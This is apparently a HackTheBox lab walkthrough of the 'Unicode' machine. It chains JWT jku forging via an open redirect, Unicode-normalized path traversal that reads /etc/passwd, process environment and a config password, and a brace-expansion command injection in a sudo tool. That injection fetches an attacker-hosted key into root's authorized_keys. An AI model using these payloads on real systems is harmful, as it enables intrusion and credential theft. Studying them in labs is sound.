# Unicode Machine(10.10.11.126)

## Info:
This was fun medium linux box where i learned about decompyling python binaries, unicode normalization and bash expansion attack to bypass white spaces filter. It had many things from JWT forging to LFI to command injection. Let's dive in!

![Unicode](https://user-images.githubusercontent.com/79413473/167262994-d45a2c93-296f-4c6f-8cee-29d4272aa4bc.png)

## Recon:

Starting with nmap port scan we 2 open ports 

```
$ nmap -T4 10.10.11.126
Starting Nmap 7.80 ( https://nmap.org ) at 2022-05-07 21:53 IST
Stats: 0:00:36 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
Connect Scan Timing: About 96.10% done; ETC: 21:54 (0:00:02 remaining)
Nmap scan report for 10.10.11.126
Host is up (0.41s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```
```
$ nmap -A -p22,80 -T4 10.10.11.126
Starting Nmap 7.80 ( https://nmap.org ) at 2022-05-07 21:54 IST

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: 503
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

![Screenshot from 2022-05-07 21-57-45](https://user-images.githubusercontent.com/79413473/167263265-d33965fd-6eb4-4f91-b2b5-985ef460e2eb.png)

Main website doesn't have any mention of hostname like `unicode.htb` but we can add that anyway. There is nothing much on page other than login & register and a interesting service `redirect` which introduces a open redirect vulnerability but for now it's of no use. Click on google about us and note the url in bottom left, you will be redirected to google.com

![Screenshot from 2022-05-07 22-02-52](https://user-images.githubusercontent.com/79413473/167263436-d6964bac-5994-4539-825b-c32e3f5be156.png)

Any directory fuzzing is annoying as evrything returns 200 OK response.

## Foothold: FOrging JWT & LFI

We don't have credential so let's register a new user

![Screenshot from 2022-05-07 22-06-12](https://user-images.githubusercontent.com/79413473/167263540-8013f3fc-12c8-47dd-83b7-e2256a59bc5f.png)

Trying to register a username admin says ` User alreay exist`. Let's try other username `test123` and it works we can login with this. It sets a JWT token as auth cookie and gives a dasboard.

![Screenshot from 2022-05-07 22-09-43](https://user-images.githubusercontent.com/79413473/167263662-0c6f58b6-af90-44c1-bde8-ad731bd912d2.png)

![Screenshot from 2022-05-07 22-09-58](https://user-images.githubusercontent.com/79413473/167263668-4cad54f2-94a1-4f8b-a275-801049a05f46.png)

there is upload functionality which accepts pdf file only we can upload any file as long as it ends with `.pdf` extension but it doesn't reveal where files are uploaded just a Thank You message. Let's focus on JWT

Decoding cookie reveals in payload there is only `user` parameter and we know there is a `admin` user. If we can forge a cookie for admin we can login as admin. 

![Screenshot from 2022-05-07 22-11-13](https://user-images.githubusercontent.com/79413473/167264058-2e5b9239-2f52-4208-a138-88ef31262ac3.png)

### Getting Admin access:

JWT header reveals hostname `hackmedia.htb` let's add that to our hosts file. And visit the json file `http://hackmedia.htb/static/jwks.json`

```
$ curl http://hackmedia.htb/static/jwks.json

{
    "keys": [
        {
            "kty": "RSA",
            "use": "sig",
            "kid": "hackthebox",
            "alg": "RS256",
            "n": "AMVcGPF62MA_lnClN4Z6WNCXZHbPYr-dhkiuE2kBaEPYYclRFDa24a-AqVY5RR2NisEP25wdHqHmGhm3Tde2xFKFzizVTxxTOy0OtoH09SGuyl_uFZI0vQMLXJtHZuy_YRWhxTSzp3bTeFZBHC3bju-UxiJZNPQq3PMMC8oTKQs5o-bjnYGi3tmTgzJrTbFkQJKltWC8XIhc5MAWUGcoI4q9DUnPj_qzsDjMBGoW1N5QtnU91jurva9SJcN0jb7aYo2vlP1JTurNBtwBMBU99CyXZ5iRJLExxgUNsDBF_DswJoOxs7CAVC5FjIqhb1tRTy3afMWsmGqw8HiUA2WFYcs",
            "e": "AQAB"
        }
    ]
}
```

Quick google search `what is jku in jwt?` reveals that it is json encoded public key file used to sign JWTs. Found [this](https://blog.pentesteracademy.com/hacking-jwt-tokens-jku-claim-misuse-2e732109ac1c) article which shows exactly how we can host our own json file and sign the forged cookie with our RSA Key pair. The difference is value of `n` and `e` paramater looks different. hackmedia jwt has Alphabets and blog has hex values. Anyway let's try it out. As instructed create a RSA key pair.

```
1. openssl genrsa -out keypair.pem 2048
2. openssl rsa -in keypair.pem -pubout -out publickey.crt
3. openssl pkcs8 -topk8 -inform PEM -outform PEM -nocrypt -in keypair.pem -out pkcs8.key
```

Private Key is `pkcs8.key` & Public Key is `publickey.crt` put that in key pair in JWT 

![Screenshot from 2022-05-07 22-39-17](https://user-images.githubusercontent.com/79413473/167264648-0d9f4d36-6333-4388-9a9f-6196a8452fef.png)

let's extract `e` & `n` from key with python script given in blog and update our json file with that,
```
from Crypto.PublicKey import RSA

fp = open("publickey.crt", "r")
key = RSA.importKey(fp.read())
fp.close()

print("n:", hex(key.n))
print("e:", hex(key.e))
```
In header i put my url 

```
{
  "typ": "JWT",
  "alg": "RS256",
  "jku": "http://10.10.16.35:9090/jwks.json"
}
```

And give the JWT to cookie and it errors out with `jku validation failed`. And no request came to my server. Signatre was verified maybe it needs `hackmedia.htb` hostname in url, and that's where open redirect vulnerability comes in handy, 

Updated JWT header 
```
{
  "typ": "JWT",
  "alg": "RS256",
  "jku": "http://hackmedia.htb/redirect/?url=10.10.16.35:9090/jwks.json"
}
```
But it will still fails with same error, looks like  `/static` also needed in path. We can bypass that easily

```
{
  "typ": "JWT",
  "alg": "RS256",
  "jku": "http://hackmedia.htb/static/../redirect/?url=10.10.16.35:9090/jwks.json"
}
```
![Screenshot from 2022-05-07 22-56-46](https://user-images.githubusercontent.com/79413473/167265192-b33eff2d-1b9e-45f3-906b-a09edaa37dfb.png)

Now this new JWT will work fine. i also get a request on my machine but no dashboard access is granted. Looks like that `n` and `e` value didn't work properly.

With little googling i [found](https://stackoverflow.com/questions/1193529/how-to-store-retrieve-rsa-public-private-key) that `AQAB` string is base64 value of string `10001` . But it is not normal base64 encoding-decoding. 

If you decode `AQAB` from base64 it prints nothing but if you do hexdump of that it gives `010001` back, hmm!

![Screenshot from 2022-05-08 00-01-13](https://user-images.githubusercontent.com/79413473/167267238-26e3224d-eeb5-4d31-be55-142c00de31f9.png)

The n and e in public key is actually modulo and exponent which can be used to recreate public key. That's what this machine must be doing to verify that public key we are providing is  what it is accepting. But it accepts n & q paramater in base64 encoded form and we gave it hexadecomal value. We need to encode that hex value to base64. We can check with openssl that hex value extracted by python script is from publickey actual hex values.

```
$ openssl rsa -pubin -in publickey.crt -text -noout
RSA Public-Key: (2048 bit)
Modulus:
    00:b2:fc:ac:ad:c4:af:3d:45:ce:59:c4:33:1a:d3:
    7a:eb:41:84:dd:06:3b:af:0a:e0:dc:e4:98:72:d2:
    2b:2a:d0:19:e7:56:fe:61:02:25:e9:aa:bf:13:c3:
    e1:59:85:a1:07:96:1c:ba:df:c1:5c:a6:76:f8:fc:
    15:48:ab:b1:57:1b:c0:61:ad:6c:eb:eb:8a:28:f9:
    33:63:8a:a4:65:c4:ba:24:95:2c:97:ee:1e:25:4f:
    d4:17:c8:59:dd:22:5e:4e:a7:ad:0e:6f:f0:4b:32:
    25:cf:ca:8f:b5:cd:6b:4e:21:cd:a7:6c:72:a7:99:
    11:7f:a7:b8:3c:4a:f3:70:eb:6d:6f:ac:ae:d0:ea:
    7f:6b:3f:a8:34:79:0b:7e:37:d0:a5:e9:c4:25:80:
    ed:49:d6:c8:b5:b1:f2:0f:c0:83:6f:d1:64:31:0e:
    20:7f:94:15:21:06:5a:c4:7d:81:c6:35:1c:be:94:
    4f:66:f1:a5:74:db:0d:d6:a8:1c:3a:44:c0:e4:0a:
    b7:f6:3b:4c:4e:bb:7c:a7:ec:67:82:2b:82:9f:d6:
    4e:c5:64:e6:3b:fa:2d:dd:cc:7c:1a:b7:38:88:e3:
    4e:a4:1f:82:c2:9d:23:94:ba:46:e2:ae:e7:cc:48:
    11:1d:19:c5:05:fd:87:6f:7c:19:33:d7:49:90:c6:
    2e:11
Exponent: 65537 (0x10001)
```

The modulus is same as hex(key.n) value just colon separated. and exponent is also same 10001 as hex(key.e). 

Now if we remember doing `echo -n AQAB | base64 -d | xxd -p` gave `010001`. Which means we can do reverse operation. From hexdump we can get base64 value

`echo -n 010001 | xxd -r -p | base64` gives `AQAB`. **xxd -r -p**  reads **raw hexdump** as input then pass it to base64.

We can similarly create modulus,take the hex(key.n) value which is same as openssl output with just `00` in beginning which doesn't matter in hex. It will work fine with or without it.

```
echo -n b2fcacadc4af3d45ce59c4331ad37aeb4184dd063baf0ae0dce49872d22b2ad019e756fe610225e9aabf13c3e15985a107961cbadfc15ca676f8fc1548abb1571bc061ad6cebeb8a28f933638aa465c4ba24952c97ee1e254fd417c859dd225e4ea7ad0e6ff04b3225cfca8fb5cd6b4e21cda76c72a799117fa7b83c4af370eb6d6facaed0ea7f6b3fa834790b7e37d0a5e9c42580ed49d6c8b5b1f20fc0836fd164310e207f941521065ac47d81c6351cbe944f66f1a574db0dd6a81c3a44c0e40ab7f63b4c4ebb7ca7ec67822b829fd64ec564e63bfa2dddcc7c1ab73888e34ea41f82c29d2394ba46e2aee7cc48111d19c505fd876f7c1933d74990c62e11 | xxd -r -p | base64 -w0
```

it gives 
```
svysrcSvPUXOWcQzGtN660GE3QY7rwrg3OSYctIrKtAZ51b+YQIl6aq/E8PhWYWhB5Ycut/BXKZ2+PwVSKuxVxvAYa1s6+uKKPkzY4qkZcS6JJUsl+4eJU/UF8hZ3SJeTqetDm/wSzIlz8qPtc1rTiHNp2xyp5kRf6e4PErzcOttb6yu0Op/az+oNHkLfjfQpenEJYDtSdbItbHyD8CDb9FkMQ4gf5QVIQZaxH2BxjUcvpRPZvGldNsN1qgcOkTA5Aq39jtMTrt8p+xngiuCn9ZOxWTmO/ot3cx8Grc4iONOpB+Cwp0jlLpG4q7nzEgRHRnFBf2Hb3wZM9dJkMYuEQ==
```

Now update values of `n` & `e` in json file

```
{
    "keys": [
        {
            "kty": "RSA",
            "use": "sig",
            "kid": "hackthebox",
            "alg": "RS256",
            "n": "svysrcSvPUXOWcQzGtN660GE3QY7rwrg3OSYctIrKtAZ51b+YQIl6aq/E8PhWYWhB5Ycut/BXKZ2+PwVSKuxVxvAYa1s6+uKKPkzY4qkZcS6JJUsl+4eJU/UF8hZ3SJeTqetDm/wSzIlz8qPtc1rTiHNp2xyp5kRf6e4PErzcOttb6yu0Op/az+oNHkLfjfQpenEJYDtSdbItbHyD8CDb9FkMQ4gf5QVIQZaxH2BxjUcvpRPZvGldNsN1qgcOkTA5Aq39jtMTrt8p+xngiuCn9ZOxWTmO/ot3cx8Grc4iONOpB+Cwp0jlLpG4q7nzEgRHRnFBf2Hb3wZM9dJkMYuEQ==",
            "e": "AQAB"
        }
    ]
}
```
You could have done it with cyberchef also, here take a look at [this](https://gchq.github.io/CyberChef/#recipe=From_Hex('Auto')To_Base64('A-Za-z0-9%2B/%3D')&input=YjJmY2FjYWRjNGFmM2Q0NWNlNTljNDMzMWFkMzdhZWI0MTg0ZGQwNjNiYWYwYWUwZGNlNDk4NzJkMjJiMmFkMDE5ZTc1NmZlNjEwMjI1ZTlhYWJmMTNjM2UxNTk4NWExMDc5NjFjYmFkZmMxNWNhNjc2ZjhmYzE1NDhhYmIxNTcxYmMwNjFhZDZjZWJlYjhhMjhmOTMzNjM4YWE0NjVjNGJhMjQ5NTJjOTdlZTFlMjU0ZmQ0MTdjODU5ZGQyMjVlNGVhN2FkMGU2ZmYwNGIzMjI1Y2ZjYThmYjVjZDZiNGUyMWNkYTc2YzcyYTc5OTExN2ZhN2I4M2M0YWYzNzBlYjZkNmZhY2FlZDBlYTdmNmIzZmE4MzQ3OTBiN2UzN2QwYTVlOWM0MjU4MGVkNDlkNmM4YjViMWYyMGZjMDgzNmZkMTY0MzEwZTIwN2Y5NDE1MjEwNjVhYzQ3ZDgxYzYzNTFjYmU5NDRmNjZmMWE1NzRkYjBkZDZhODFjM2E0NGMwZTQwYWI3ZjYzYjRjNGViYjdjYTdlYzY3ODIyYjgyOWZkNjRlYzU2NGU2M2JmYTJkZGRjYzdjMWFiNzM4ODhlMzRlYTQxZjgyYzI5ZDIzOTRiYTQ2ZTJhZWU3Y2M0ODExMWQxOWM1MDVmZDg3NmY3YzE5MzNkNzQ5OTBjNjJlMTE)

Host the json file and update jwt header & body with correct payload.

#### Updated JWT:

```
eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImprdSI6Imh0dHA6Ly9oYWNrbWVkaWEuaHRiL3N0YXRpYy8uLi9yZWRpcmVjdC8_dXJsPTEwLjEwLjE2LjM1OjkwOTAvandrcy5qc29uIn0.eyJ1c2VyIjoiYWRtaW4ifQ.fc7544O_NKDrE7Ng_n1KgL_GXTemN_pBexz0u_a1FoMPGsVXxGZUfuAyCngNtj62jMHgbEfrTQBIagb8ZNYYD-DB877p-nt8etd5dTFIUaSEiyU--fapoiorvagOCWRVblYORI3AMAkaKjcwo7tAl3D896yNkKMTKoLf_ZUZIUiYKZhqEnqmbBdulrDLn-dD8qSuBPzrD5whPuyq5dopU5UVhdtMJXNEfmmHlKJraNhLSqbj1ZGYHikqT8GlvPZLPhUqMXr_zdpBtCKIBMQv-x-GOrtShDJXYsPkmZwD6F1lDUNVPVlGxwBMYm-WZDchsXVXehGt07D3zwn_gqGEjg
```

Send it in cookie, we are greeted with `Admin dashboard`.

![Screenshot from 2022-05-08 00-30-26](https://user-images.githubusercontent.com/79413473/167268249-e7d1708b-50e9-4aab-89c2-f86178ae0aef.png)

### Exploting LFI:

Under saved report section, there is option to visit old reports. Clicking it gives 

![Screenshot from 2022-05-08 00-44-03](https://user-images.githubusercontent.com/79413473/167268641-a202387f-987a-49be-8329-a4cbdae88ac8.png)

But note the url `http://hackmedia.htb/display/?page=quarterly.pdf`, `?page=` parameter is very interesting this clearly could be vulnerable to LFI attacks. If server tries to read whatever input we give to `?page` paramater.

and trying a simple LFI payload `../../../../../../etc/passwd` confirms our intuition as it errors out with this

![2022-05-08_00-47](https://user-images.githubusercontent.com/79413473/167268746-68e75d27-ea9f-4e7c-98bf-ed7c86ce1604.png)

and whenever there is a filter there is a bypass. 

Now i tried multiple payloads and everything sticks> one giveaway i took from ippsec is start small and check wht's cauing the error. It's the combination of `..` & `/` which trigger waf. `..` alone doesn't trigger. `/etc` triggers the waf. So somehow in LFI payloads `/` is getting filtered. Maybe we should focus on bypassing that with some encodings like url, html but everything fails. As box name is unicode that could be a hint let's try unicode encoding. 

Now i remember when i first did this box i struggled a lot with this, someone pointed me to a payload page which had some unicode LFI payload where i got this payload `︰/︰/︰/︰/︰/︰/︰/︰/` and it works.

![Screenshot from 2022-05-08 01-34-37](https://user-images.githubusercontent.com/79413473/167270082-97300b07-7c93-45bf-a65e-39f376e89a2d.png)

But if i kept some calm and researched more, [hacktricks](https://book.hacktricks.xyz/pentesting-web/unicode-normalization-vulnerability) has nice page explaining what unicode is and links some unicode equivalent of some characters. It further links to more unicode characters. 

what we need is that `/` can be represented with `%ef%bc%8f` which on normalization becomes `／` notice the tilt & texture. And this also works.

![Screenshot from 2022-05-08 01-42-03](https://user-images.githubusercontent.com/79413473/167270314-e717b04b-0ab1-4567-9797-82cb16d93137.png)

You can see how browser shows unicode value , but it's different from general `../../../`

![Screenshot from 2022-05-08 01-43-00](https://user-images.githubusercontent.com/79413473/167270344-1847aa0a-90b6-4677-a971-80e6ac9a0b96.png)

Let's extract some useful information now. We can query current process and environment variables with `/proc/self`. 

`..%ef%bc%8f..%ef%bc%8f..%ef%bc%8f..%ef%bc%8f..%ef%bc%8fproc/self/cmdline` gives 

![Screenshot from 2022-05-08 01-49-55](https://user-images.githubusercontent.com/79413473/167270507-296c73b6-e213-44cb-b1b4-e15e77a0f2a1.png)

`..%ef%bc%8f..%ef%bc%8f..%ef%bc%8f..%ef%bc%8f..%ef%bc%8fproc/self/environ` gives environment variables.

![Screenshot from 2022-05-08 01-50-12](https://user-images.githubusercontent.com/79413473/167270518-dfe5746d-14c6-482f-8a3a-91c8c58840fd.png)

code user is running this application. But we don't need to know that we can directly go into working directory with

`proc/self/cwd` , and in python application `app.py` file very common, let's read that

`..%ef%bc%8f..%ef%bc%8f..%ef%bc%8f..%ef%bc%8f..%ef%bc%8fproc/self/cwd/app.py `

![Screenshot from 2022-05-08 01-53-18](https://user-images.githubusercontent.com/79413473/167270602-e9b75c1e-4848-4ec1-88cb-9eefb2648af4.png)

 and from `db.yaml` file we can get `code`'s password. We could have found this `db.yaml` file with `/etc/nginx/sites-enabled/default`
 
 ![Screenshot from 2022-05-08 01-54-50](https://user-images.githubusercontent.com/79413473/167270644-2ca6843d-13a2-4174-881e-f4c333cb987d.png)

It's location is `/home/code/coder/db.yaml` or you can read it from `/proc/self/cwd/db.yaml`

```
mysql_host: "localhost"
mysql_user: "code"
mysql_password: "B3stC0d3r2021@@!"
mysql_db: "user"
```
Let's try to ssh with this password.

![Screenshot from 2022-05-08 02-00-52](https://user-images.githubusercontent.com/79413473/167270788-fa1e04b8-50e1-4ac4-930d-fa8e183885f1.png)

## privilege escalation: command injection

After we can do `sudo -l` and it tells as sudo we can run `/usr/bin/treport` without any password. It has 4 menus to operate. On exiting the program it tells it is a python application i.e `treport.py`. I tried to find but maybe it's in root directory.

```
code@code:~$ sudo treport
1.Create Threat Report.
2.Read Threat Report.
3.Download A Threat Report.
4.Quit.
Enter your choice:^CTraceback (most recent call last):
  File "treport.py", line 67, in <module>
KeyboardInterrupt
[54250] Failed to execute script 'treport' due to unhandled exception!
```

Let's select 3rd choice download a report.Normal  It asks for url and filname, Hit enetr without any input it erros out and tell it's running curl on our input.
```
Enter your choice:3
Enter the IP/file_name:
curl: no URL specified!
curl: try 'curl --help' or 'curl --manual' for more information
```
or you can give your server url and check the user agent on connection recevied. Now i tried to read files by `file://` wrapper as `http://` was supported and curl also supports `file://`.  But it says `INVALID URL`. 

Normal command injection payloads doesn't work as python must be filtering these things. That's why somehow `File` bypasses the filter and tries to downlaod the file.

![Screenshot from 2022-05-08 02-35-38](https://user-images.githubusercontent.com/79413473/167271705-87f8f87d-0861-4024-b17f-1e466c4b2fad.png)

But no file is created, also ippsec showed we could bypass filter with `fi\le`, escape character in string, as it is same as `file`.

Now going blind with this application was little annoyin so i decided to decompile the binary. 

### Decompiling treport binary:

Transfer the binary to your system. With help of [pyinstxtractor](https://github.com/extremecoders-re/pyinstxtractor) we can can extract .pyc file which is compiled python bytecode. And using [uncompyle](https://pypi.org/project/uncompyle6/) we can extract python code from this pyc file.

```
import os, sys
from datetime import datetime
import re

class threat_report:

    def create(self):
        file_name = input('Enter the filename:')
        content = input('Enter the report:')
        if '../' in file_name:
            print('NOT ALLOWED')
            sys.exit(0)
        file_path = '/root/reports/' + file_name
        with open(file_path, 'w') as (fd):
            fd.write(content)

    def list_files(self):
        file_list = os.listdir('/root/reports/')
        files_in_dir = ' '.join([str(elem) for elem in file_list])
        print('ALL THE THREAT REPORTS:')
        print(files_in_dir)

    def read_file(self):
        file_name = input('\nEnter the filename:')
        if '../' in file_name:
            print('NOT ALLOWED')
            sys.exit(0)
        contents = ''
        file_name = '/root/reports/' + file_name
        try:
            with open(file_name, 'r') as (fd):
                contents = fd.read()
        except:
            print('SOMETHING IS WRONG')
        else:
            print(contents)

    def download(self):
        now = datetime.now()
        current_time = now.strftime('%H_%M_%S')
        command_injection_list = ['$', '`', ';', '&', '|', '||', '>', '<', '?', "'", '@', '#', '$', '%', '^', '(', ')']
        ip = input('Enter the IP/file_name:')
        res = bool(re.search('\\s', ip))
        if res:
            print('INVALID IP')
            sys.exit(0)
        if 'file' in ip or 'gopher' in ip or 'mysql' in ip:
            print('INVALID URL')
            sys.exit(0)
        for vars in command_injection_list:
            if vars in ip:
                print('NOT ALLOWED')
                sys.exit(0)
            cmd = '/bin/bash -c "curl ' + ip + ' -o /root/reports/threat_report_' + current_time + '"'
            os.system(cmd)


if __name__ == '__main__':
    obj = threat_report()
    print('1.Create Threat Report.')
    print('2.Read Threat Report.')
    print('3.Download A Threat Report.')
    print('4.Quit.')
    check = True
    if check:
        choice = input('Enter your choice:')
        try:
            choice = int(choice)
        except:
            print('Wrong Input')
            sys.exit(0)
        else:
            if choice == 1:
                obj.create()
            elif choice == 2:
                obj.list_files()
                obj.read_file()
            elif choice == 3:
                obj.download()
            elif choice == 4:
                check = False
            else:
                print('Wrong input.')
```

Now this explains why `file` and other command injection payload were not working. Using our bypasses we can download privileges files but they are outputted to `/root/` directory which we can't read. We can't inject `-o` it also filters white spaces and so we can't inject `${IFS}` due to `$` symbol so we have to come up with something else.

### Saving curl output:

Hacktricks hash a neat tricks to bypass white spaces filter, one of them is `{echo,hello}` this will become `echo hello` in bash. Curl is also executed inside `/bin/bash`. Let's try this.

`{FIle:///root/root.txt,-o,/tmp/f}` enter this as url and it will download flag and save it to `/tmp/f`

![Screenshot from 2022-05-08 03-03-59](https://user-images.githubusercontent.com/79413473/167272347-60cb1778-e2e3-40b0-9b4d-e22ec6c4ba10.png)

basically this became 

`curl file:///root/root.txt -o /tmp/f -o /root/reports/threat_report_' + current_time + '`

seconnd `-o` flag will be ignored. And this wway we can read root flag. Also we can place our ssh keys in root directory

```
{10.10.16.35:9090/id_rsa.pub,-o,/root/.ssh/authorized_keys}
```
and we can login as root with our RSA key, `ssh -i id_rsa root@hackmedia.htb`

![Screenshot from 2022-05-08 03-09-47](https://user-images.githubusercontent.com/79413473/167272485-96a6ca8a-84d7-4fdb-aa4b-f6a0a8c4716b.png)


and that's how we get root on this machine. Thank you for reading. 

Twitter: [Avinashkroy](https://twitter.com/avinashkroy)

